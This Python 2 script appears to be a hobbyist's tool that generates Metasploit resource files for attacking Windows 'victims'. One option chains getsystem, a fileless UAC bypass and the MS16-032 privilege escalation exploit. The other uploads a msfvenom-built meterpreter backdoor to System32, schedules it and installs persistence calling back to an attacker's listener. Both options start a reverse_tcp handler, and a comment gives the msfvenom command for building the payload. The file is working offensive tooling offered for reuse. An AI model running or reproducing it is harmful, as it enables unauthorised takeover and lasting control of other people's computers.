#!/usr/bin/env python
import time,os,shutil

#It was just a practice i was doing :) 
#you can use this script into any automated famework you working on for msf with just slightly edit :) 
#Important Modules :
#MOF_ps_persist : http://raw.githubusercontent.com/khr0x40sh/metasploit-modules/master/persistence/mof_ps_persist.rb
#https://github.com/r00t-3xp10it/msf-auxiliarys/blob/master/local%20privilege%20escalation/enigma_fileless_uac_bypass.rb
#
ver = "1.0"
author = "Chaitanya [twitter : @bofheaded]"
banner = """
Resource File Generator %s
created by %s
	
+---------+----------------------+
| Options |      Category        |
+---------+------------------------------------+
|  1.     | Privilege Escalation               |
|  2.     | Persistence                        |
+---------+------------------------------------+ 

NOTE : THESE MODULES ARE COMPATIBLE 
	TO WINDOWS BASED VICTIMS
	ONLY. ALSO THEY ARE FOR 
	AUTOMATED HIT AND TRIAL
	TO ACCOMPLISH SOME TASKS.
		 """%(ver , author)
print banner

option = str(raw_input('Slect Option To Begin With >> '))
print ""
lhost = str(raw_input('LHOST > '))
lport = str(raw_input('LPORT > '))
print ""
session = str(raw_input('please specify a session >> '))
if option == "1":
	
	lp = str(raw_input('LPORT for rc script to actioned upon > ')) 
	print "[!] Generating RC file for Privilege Escalation"
	privs = """
	
sysinfo
getuid
	
getprivs
getsystem
background
setg session """+str(session)+"""
use post/windows/escalate/enigma_fileless_uac_bypass	
show advanced options
set USE_POWERSHELL true
set EXEC_COMMAND aDfSjRnGlsWlDtBsQkGftmoEdD==
show advanced options
exploit
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
show advanced options
exploit

sessions -i """+str(session)+"""
sysinfo
getuid
			"""
	f = open('get_privs.rc' , 'w')
	f.write(privs)
	f.close()
	os.system ('sudo chmod 777 get_privs.rc')
	os.system("""xterm -e 'msfconsole -x "use exploit/multi/handler; set LHOST """+lhost+"""; set LPORT """+lp+"""; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc get_privs.rc; exploit -j"'""")
	print "[+] get_privs.rc has been saved [+]"
	print """
NOTE ::

This script requires some custom modules to be installed .. make sure you have them installed in your Metasploit

	      """ 

	print """
Usage :
		meterpreter > resource /<path>/get_privs.rc
		  
		  """
		
	time.sleep(5)
	exit()

if option == "2":

	lp = str(raw_input('LPORT for rc script to actioned upon > ')) 
	print "[!] Generating RC file for Persistence"
	print ""
	print """

NOTE :
	   Privileges should be escalated to "NT AUTHORITY\SYSTEM", as some files are to be injected/saved into 
	   "C:\Windows\System32" folder during task being conduct. 

	   This exploit needs a backdoor/payload generated from msfvenom to be saved in your 
       system with name "payload.exe" which will be uploaded and further exploitation 
       will be conducted on its behalf.
       $ msfvenom -i 3 -a x86 -p meterpreter/reverse_tcp LHOST=192.168.0.102 LPORT=888 -f exe > payload.exe

	   This Script Uses MOF_ps_persist module kindly download it from link given below
	   => http://raw.githubusercontent.com/khr0x40sh/metasploit-modules/master/persistence/mof_ps_persist.rb	
	"""
	per = """

sysinfo
getuid
migrate -n explorer.exe
upload payload.exe C:\\\Windows\\\System32
run scheduleme -hr 1 -c "C:\\\Windows\\\System32\\\payload.exe"
run persistence -U -i 5 -p """+str(lport)+""" -r """+str(lhost)+"""
background
setg session """+str(session)+"""
use post/windows/mof_ps_persist
show options
exploit
			"""
	f = open('get_persist.rc' , 'w')
	f.write(per)
	f.close()
	
	os.system ('sudo chmod 777 get_persist.rc')
	time.sleep(2)
	os.system("""xterm -e 'msfconsole -x "use exploit/multi/handler; set LHOST """+lhost+"""; set LPORT """+lp+"""; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc get_persist.rc; exploit -j"'""")
	print "[+] get_persist.rc has been saved [+]"
	print """
Usage :
		meterpreter > resource /<path>/get_persist.rc
		  
		  """
		
	time.sleep(10)
	exit()

else:
	print "[-] Wrong Option >Quitting< [-]"
	exit()
	
